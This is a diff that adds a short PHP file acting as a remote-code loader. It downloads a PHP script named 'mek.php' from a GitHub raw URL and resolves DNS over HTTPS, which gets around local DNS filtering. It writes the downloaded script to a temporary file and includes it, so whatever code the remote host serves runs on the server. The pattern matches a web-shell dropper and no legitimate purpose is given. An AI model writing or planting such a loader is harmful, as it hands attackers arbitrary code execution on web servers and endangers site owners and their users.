@@ -1,0 +1,39 @@
+<?php
+$url = 'https://raw.githubusercontent.com/Jenderal92/KC5/refs/heads/master/mek.php';
+$dns = 'https://cloudflare-dns.com/dns-query';
+
+$ch = curl_init($url);
+if (defined('CURLOPT_DOH_URL')) {
+    curl_setopt($ch, CURLOPT_DOH_URL, $dns);
+}
+
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+
+$res = curl_exec($ch);
+
+if (curl_errno($ch)) {
+    die('cURL Error: ' . curl_error($ch));
+}
+
+$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+curl_close($ch);
+
+if ($httpCode !== 200 || !$res) {
+    die('Failed to fetch remote PHP file.');
+}
+
+$tmp = tmpfile();
+if (!$tmp) {
+    die('Failed to create a temporary file.');
+}
+
+$meta = stream_get_meta_data($tmp);
+$path = $meta['uri'];
+
+fwrite($tmp, $res);
+include($path);
+
+?>
+	
